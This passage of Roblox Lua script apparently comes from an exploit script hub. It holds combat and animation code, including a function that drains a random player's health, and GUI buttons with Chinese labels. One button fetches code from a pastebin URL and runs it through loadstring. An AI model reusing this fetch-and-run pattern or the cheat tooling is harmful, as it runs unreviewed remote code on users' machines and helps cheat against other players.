        local p = Part2("Effect",workspace,Vector3.new(size,size,size),origin,color,0,true,false,"SmoothPlastic")
        local m = Mesh(p,"Sphere")
        q(function(pa,me)
                for i=0,1,0.05 do
                        me.Scale = me.Scale+Vector3.new(0,i*10,0)
                        pa.Transparency = i
                        wait(1/30)
                end
                pa:Destroy()
        end,{p,m})
end
function quickSound(id,v)
        local s = Instance.new("Sound",workspace)
        s.SoundId = id
        s.PlayOnRemove = true
        s.Volume = v or 1
        delay(0.025,function()s:remove()end)
end
function checkDmgArea(origin,dmg,d)
        for i,v in pairs(workspace:children())do
                if v~=char and v:FindFirstChild("Torso") then
                        local h;
                        for _,k in pairs(v:children())do if k:IsA("Humanoid") then h = k end end
                        local dist = (origin.p - v:FindFirstChild("Torso").CFrame.p).magnitude
                        if dist < d and h~=nil then
                                h.Health = h.Health - dmg
                        end
                end
        end
end
function findClosestPlayer(origin,d)
        local bdist,plr = d,nil
        for i,v in pairs(workspace:children())do
                if v~=char and v:FindFirstChild("Torso") then
                        local h;
                        for _,k in pairs(v:children())do if k:IsA("Humanoid") then h = k end end
                        local dist = (origin.p - v:FindFirstChild("Torso").CFrame.p).magnitude
                        if dist < bdist and h~=nil and h.Health~=0 then
                                bdist,plr = dist,v
                        end
                end
        end
        return bdist,plr
end
function Attack1(victim)
        Attacking = true
        local victim = game.Players:GetPlayers()[math.random(1,#game.Players:children())]:FindFirstChild("Torso")
        local h;
        for _,k in pairs(victim:children())do if k:IsA("Humanoid") then h = k end end
        if h==nil then return end
        local bg = Instance.new("BodyGyro",torso)
        bg.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
        bg.P = 1000000
        local bp = Instance.new("BodyPosition")
        bp.maxForce = Vector3.new(1/0,1/0,1/0)*math.huge
        local bp2 = bp:Clone()
        local cf1,cf2 = CFrame.new(torso.CFrame.x,torso.CFrame.y,torso.CFrame.z),CFrame.new(t.CFrame.x,torso.CFrame.y,t.CFrame.z)
        bg.cframe = CFrame.new(cf1.p,cf2.p)
        bp2.Parent = t
        bp2.position = cf2.p
        bp.Parent = torso
        bp.position = cf1.p
        local spiral = math.random(-360,360)
        for i=1,20 do
                wait(1/30)
                bp2.position = bp2.position+Vector3.new(0,2,0)
                bp.position = bp.position+Vector3.new(0,2,0)
                cylinderExplode(torso.CFrame*CFrame.new(0,-3,0),colours[2],1,0)
                cylinderExplode(t.CFrame*CFrame.new(0,-3,0),colours[2],1,0)
        end
        bp.position = (t.CFrame*CFrame.Angles(0,math.rad(spiral),0)*CFrame.new(0,0,50)).p
        for i=1,5 do
                wait(1/30)
                local speed = i/5
                rs.C0 = cslerp(rs.C0,c0rs*CFrame.Angles(math.pi/4,0,math.pi/12),speed)
                ls.C0 = cslerp(ls.C0,c0ls*CFrame.Angles(math.pi/4,0,-math.pi/12),speed)        
        end
        for i=10,1,-1 do
                for _,v in pairs(t.Parent:children())do if v:IsA("Part") then v.CanCollide = false elseif v:IsA("Hat") then v.Handle.CanCollide = false end end
                local dmg = h.Health/i
                bp.position = (t.CFrame*CFrame.Angles(0,math.rad(spiral),0)*CFrame.new(0,0,(i%2==0 and 50)or -50)).p
                bg.cframe = CFrame.new(torso.CFrame.p,t.CFrame.p)
                wait(.1)
                Smoke(t.CFrame,"Black")
                local a = math.rad(math.random(-360,360))
                ringExplode(t.CFrame*CFrame.Angles(a,a,a),i%2==0 and colours[2]or colours[1],20)
                h.Health = h.Health - dmg
                if i%2==0 then
                        spiral = math.random(-360,360)
                end
                wait(.3)
        end
        bg:Destroy()
        bp:Destroy()
        bp2:Destroy()
        Attacking = false
end



function kick()
attack=true
con1=LeftLeg.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
Humanoid.WalkSpeed = 0
for i=0,1,0.2 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-20),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-20),math.rad(0),math.rad(-30)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(-30),math.rad(-90),math.rad(0)),.3)
end
so("http://roblox.com/asset/?id=200632211",LeftLeg,1,1) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(-30)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(100),math.rad(-90),math.rad(0)),.3)
end
attack=false
Humanoid.WalkSpeed = 16
con1:disconnect()
end


function throw()
		attack=true
		con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(5,10),"Normal",RootPart,.2,1) end) 
		for i=0,1,0.05 do
			swait()
			Neck.C0=clerp(Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(45)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(-45)),.3)
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-170),math.rad(6.5),math.rad(31)),.3)
			RW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(30),math.rad(0),math.rad(-20)),.3)
			LW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
			HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(45),math.rad(0),math.rad(0)),.3)
		end
		so("http://roblox.com/asset/?id=231917871",HitboxA,1,0.8)
					hitconasdf = HitboxA.Touched:connect(function(hit)
		local hum12 = hit.Parent:FindFirstChild("Humanoid")
		if hum12 and not hum12:IsDescendantOf(Character) then
			--so('http://roblox.com/asset/?id=220025675',HitboxA,1,3)
			hitconasdf:disconnect()
		end
		end)
		for i=0,0.5,2 do
		so("http://roblox.com/asset/?id=231917987",HitboxA,1,1)
		swait()
		for i=0,1,0.025 do
			swait()
			Neck.C0=clerp(Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-30)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(30)),.3)
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(90),math.rad(6.5),math.rad(31)),.3)
			RW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-30),math.rad(0),math.rad(-20)),.3)
			LW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
			HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0-50*i,0)*angles(math.rad(-45-1800*i),math.rad(0),math.rad(0)),.3)
		end
		end
		for i=0,0.5,2 do
		so("http://roblox.com/asset/?id=231917987",HitboxA,1,1)
		swait()
		for i=0,1,0.025 do
			swait()
			Neck.C0=clerp(Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(-30)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(30)),.3)
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(90),math.rad(6.5),math.rad(31)),.3)
			RW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-30),math.rad(0),math.rad(-20)),.3)
			LW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
			HandleAweld.C0=clerp(HandleAweld.C0,cf(0,-50+50*i,0)*angles(math.rad(-45-1800*i),math.rad(0),math.rad(0)),.3)
		end
		end
		for i=0,1,0.1 do
			swait()
			Neck.C0=clerp(Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(45)),.3)
			RootJoint.C0=clerp(RootJoint.C0,RootCF*angles(math.rad(0),math.rad(0),math.rad(-45)),.3)
			RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-170),math.rad(6.5),math.rad(31)),.3)
			RW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(30),math.rad(0),math.rad(-20)),.3)
			LW.C1=clerp(LW.C1,cf(0,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
			RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
			LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
			HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(45),math.rad(0),math.rad(0)),.3)
		end
		attack=false
	con1:disconnect()
	hitconasdf:disconnect()
end

function DualStab()
attack=true
con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
for i=0,1,0.2 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(-90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
end
        so("http://www.roblox.com/asset/?id=233856146",HitboxA,1,1) 
        so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(130),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(-130),math.rad(-90)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,-1,-1)*angles(math.rad(-120),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,-1,-1)*angles(math.rad(-120),math.rad(0),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
Torso.Velocity=Head.CFrame.lookVector*50
end
con1:disconnect()
con2:disconnect()
attack=false
end

function DualSlash()
attack=true
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(90),math.rad(50),math.rad(0)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(90),math.rad(-50),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(5),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
end
con1=HitboxA.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
con2=HitboxB.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
so("http://www.roblox.com/asset/?id=233856146",HitboxA,1,1) 
so("http://www.roblox.com/asset/?id=234365573",HitboxB,1,1) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(20),math.rad(60)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(-20),math.rad(-60)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,-1,-1)*angles(math.rad(-60),math.rad(0),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,-1,-1)*angles(math.rad(-60),math.rad(0),math.rad(0)),.3)
end
con1:disconnect()
con2:disconnect()
attack=false
end
function JumpSpin()
attack = true
for i = 1, 55 do
            RootPart.CFrame = RootPart.CFrame * CFrame.new(0, 10, 0)
            ringExplode(Torso.CFrame*CFrame.Angles(math.pi/2,0,0),colours[6],5)
end
wait(1.6)
spin()
attack = false
end

mouse.Button1Down:connect(function()
        if attack==false then
                if attacktype==1 then
                        attack=true
                        attacktype=2
                        attackone()
                elseif attacktype==2 then
                        attack=true
                        attacktype=3
                        attacktwo()
                elseif attacktype==3 then
                        attack=true
                        attacktype=1
                        attackthree()
                end
        end
end)
colours = {"Tr. Red","Black","Tr. Blue","Black","Phosph. White","Royal purple"}
mouse.KeyDown:connect(function(k)
        k=k:lower()
        if k=='q' and mana >= 100 then
                if attack==false then
                        MetalStorm()
                end
				elseif k=="t" then
				if attack==false then
						throw()
				end
                elseif k=='e' then
                if attack==false then
                        kick()
                end
                elseif k=='p' then
                if attack==false then
                DemonSwords()
                end
                elseif k=='h' then
                if Attacking==false then
                summonMura()
                end
                elseif k=='r' then
                if attack==false then
                        DualStab()
                end
                elseif k:byte() == 50 then
                for i = 1, 5 do
                    RootPart.CFrame = RootPart.CFrame * CFrame.new(0, 0, -5)
                    ringExplode(Torso.CFrame*CFrame.Angles(0,0,0),colours[6],5)
                    wait()
                end
                elseif k:byte() == 49 then
                if attack == false then
                       JumpSpin()
                end
                elseif k=='f' then
                if attack==false then
                        DualSlash()
        end
        end
end)
mouse.KeyDown:connect(function(key)
key:lower()
if key:byte() == 48 then
Humanoid.WalkSpeed=70
end
end)
mouse.KeyUp:connect(function(key)
key:lower()
if key:byte() == 48 then
Humanoid.WalkSpeed=16
end
end)
wait(2)
Chat(Cha.Head,Taunts[math.random(1,#Taunts)],"Really black")

local sine = 0
local change = 1
local val = 0

local mananum=0
while true do
swait()
sine = sine + change
local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
if equipped==true or equipped==false then
if attack==false then
idle=idle+1
else
idle=0
end
if idle>=500 then
if attack==false then
--Sheath()
end
end
if RootPart.Velocity.y > 1 and hitfloor==nil then 
Anim="Jump"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(20),math.rad(-10),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(20),math.rad(0),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(5,4,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(-5,4,0)*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
end
elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
Anim="Fall"
if attack==false then
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-50),math.rad(-100),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-50),math.rad(100),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(20),math.rad(-50),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(20),math.rad(50),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,4,0)*angles(math.rad(20),math.rad(-50),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,4,0)*angles(math.rad(20),math.rad(50),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(5,4,0)*angles(math.rad(20),math.rad(-50),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(-5,4,0)*angles(math.rad(20),math.rad(50),math.rad(0)),.3)
end
elseif torvel<1 and hitfloor~=nil then
Anim="Idle"
if attack==false then
change=1
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0.20+0.1*math.cos(sine/25),0)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(40)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.55+0.1*math.cos(sine/25),0)*euler(math.rad(10),math.rad(-0.5),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.55+0.1*math.cos(sine/25),0)*euler(math.rad(10),math.rad(20),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(-20),math.rad(-60),math.rad(-10-4*math.cos(sine/25))),.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(-600),math.rad(-10-4*math.cos(sine/25))),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,-0.55+0.1*math.cos(sine/-25))*angles(math.rad(math.sin(sine/20)),math.rad(-20+2*math.cos(sine/50)),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,-0.55+0.1*math.cos(sine/-25))*angles(math.rad(-math.sin(sine/20)),math.rad(10+2*math.cos(sine/-50)),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(5,4,0.55+0.1*math.cos(sine/-25))*angles(math.rad(-math.sin(sine/20)),math.rad(50),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(-5,4,0.55+0.1*math.cos(sine/-25))*angles(math.rad(math.sin(sine/20)),math.rad(-50),math.rad(0)),.3)
end
elseif torvel>2 and torvel<22 and hitfloor~=nil then
Anim="Walk"
if attack==false then
change=3
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-20),math.rad(-10),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-20),math.rad(10),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(math.sin(100*sine/-50)),math.rad(-50),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(math.sin(100*sine/50)),math.rad(50),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(5,4,0)*angles(math.rad(math.sin(sine/-20)),math.rad(math.sin(100*sine/50)),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(-5,4,0)*angles(math.rad(math.sin(sine/-20)),math.rad(math.sin(100*sine/-50)),math.rad(0)),.3)
end
elseif torvel>=22 and hitfloor~=nil then
Anim="Run"
if attack==false then
change=5
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-20),math.rad(-100),math.rad(30)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-20),math.rad(100),math.rad(-30)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
HandleBweld.C0=clerp(HandleBweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleAweld.C0=clerp(HandleAweld.C0,cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
HandleDweld.C0=clerp(HandleDweld.C0,cf(5,0,0)*angles(math.rad(-50),math.rad(-50),math.rad(0)),.3)
HandleCweld.C0=clerp(HandleCweld.C0,cf(-5,0,0)*angles(math.rad(-50),math.rad(50),math.rad(0)),.3)
HandleFweld.C0=clerp(HandleFweld.C0,cf(5,3,0)*angles(math.rad(-50),math.rad(-50),math.rad(0)),.3)
HandleEweld.C0=clerp(HandleEweld.C0,cf(-5,3,0)*angles(math.rad(-50),math.rad(50),math.rad(0)),.3)
end
end
end
fenbarmana2:TweenSize(UDim2.new(4*mana/100,0,0.2,0),nil,1,0.4,true)
fenbarmana4.Text="[Ultimate]                    <{[  "..mana.."  ]}>                    [Ultimate]"
if mana>=100 then
mana=100
else
if mananum<=8 then
mananum=mananum+1
else
mananum=0
mana=math.ceil(mana+0.5)
end
end
end


  	end    

})

Tab:AddButton({

	Name = "机器人",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/7prijqYH"))()

  	end    

})

Tab:AddButton({

	Name = "边跳边走",

	Callback = function()

     AnimationId = "248263260"
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://"..AnimationId
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(1)

  	end    

})

Tab:AddButton({

	Name = "成为醉汉",

	Callback = function()

     wait(1)
Player = game:GetService("Players").LocalPlayer
Character = Player.Character
Mouse = Player:GetMouse()
m = Instance.new("Model", Character)
local weldBetween = function(a, b)
  local weldd = Instance.new("ManualWeld")
  weldd.Part0 = a
  weldd.Part1 = b
  weldd.C0 = CFrame.new()
  weldd.C1 = b.CFrame:inverse() * a.CFrame
  weldd.Parent = a
  return weldd
end
it = Instance.new
function nooutline(part)
  part.TopSurface, part.BottomSurface, part.LeftSurface, part.RightSurface, part.FrontSurface, part.BackSurface = 10, 10, 10, 10, 10, 10
end
function part(formfactor, parent, material, reflectance, transparency, brickcolor, name, size)
  local fp = it("Part")
  fp.formFactor = formfactor
  fp.Parent = parent
  fp.Reflectance = reflectance
  fp.Transparency = transparency
  fp.CanCollide = false
  fp.Locked = true
  fp.BrickColor = BrickColor.new(tostring(brickcolor))
  fp.Name = name
  fp.Size = size
  fp.Position = Character.Torso.Position
  nooutline(fp)
  fp.Material = material
  fp:BreakJoints()
  return fp
end
function mesh(Mesh, part, meshtype, meshid, offset, scale)
  local mesh = it(Mesh)
  mesh.Parent = part
  if Mesh == "SpecialMesh" then
    mesh.MeshType = meshtype
    mesh.MeshId = meshid
  end
  mesh.Offset = offset
  mesh.Scale = scale
  return mesh
end
function weld(parent, part0, part1, c0, c1)
  local weld = it("Weld")
  weld.Parent = parent
  weld.Part0 = part0
  weld.Part1 = part1
  weld.C0 = c0
  weld.C1 = c1
  return weld
end
F = part(Enum.FormFactor.Plate, m, Enum.Material.Plastic, 0, 0, "Royal purple", "Handle", Vector3.new(3.5875988, 0.478346467, 1.19586647))
Fweld = weld(m, Character.Head, F, CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), CFrame.new(-0.0157470703, -0.438977718, 0.00266170502, 0.995733142, 0, 0.0922800079, 0.00925354939, 0.994959533, -0.0998490006, -0.0918148756, 0.10027688, 0.990714252))
mesh("SpecialMesh", F, Enum.MeshType.FileMesh, "http://www.roblox.com/asset/?id=1029012", Vector3.new(0, 0, 0), Vector3.new(1.31545293, 1.31545281, 1.31545317))
player = game.Players.LocalPlayer
char = player.Character
run = game:GetService("RunService")
local xd = Instance.new("Model", game.Workspace)
xd.Name = player.Name .. "'s INSTANCES"
ignore = {}
mouse = player:GetMouse()
mouse.TargetFilter = xd
local IdleAndWalk = false
current = true
skl = false
function onKeyDown(key)
  key:lower()
  if key == "f" then
    do
      local Camera = game.Workspace.CurrentCamera
      local Player = game:GetService("Players").LocalPlayer
      repeat
        wait()
      until Player.Character
      Camera.CameraType = "Scriptable"
      game:GetService("RunService").Stepped:connect(function()
        Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.fromEulerAnglesXYZ(0.01, 0.01, 0.01)
      end)
    end
  end
end
mouse.KeyDown:connect(onKeyDown)
function onKeyDown(key)
  key:lower()
  if key == "g" then
    local Camera = game.Workspace.CurrentCamera
    Camera.CameraType = "Follow"
  end
end
mouse.KeyDown:connect(onKeyDown)
local Player, Character, Mouse = game:service("Players").LocalPlayer, game:GetService("Players").LocalPlayer.Character, game:GetService("Players").LocalPlayer:GetMouse()
local currentCam = workspace.CurrentCamera
Humanoid = Character:findFirstChild("Humanoid")
Torso = Character:findFirstChild("Torso")
Head = Character:findFirstChild("Head")
Right_Arm = Character:findFirstChild("Right Arm")
Left_Arm = Character:findFirstChild("Left Arm")
Right_Leg = Character:findFirstChild("Right Leg")
Right_Leg.FormFactor = "Custom"
Left_Leg = Character:findFirstChild("Left Leg")
Left_Leg.FormFactor = "Custom"
Right_Shoulder = Torso:findFirstChild("Right Shoulder")
Left_Shoulder = Torso:findFirstChild("Left Shoulder")
Right_Hip = Torso:findFirstChild("Right Hip")
Left_Hip = Torso:findFirstChild("Left Hip")
Neck = Torso:findFirstChild("Neck")
rootPart = Character:findFirstChild("HumanoidRootPart")
rootPart.Archivable = true
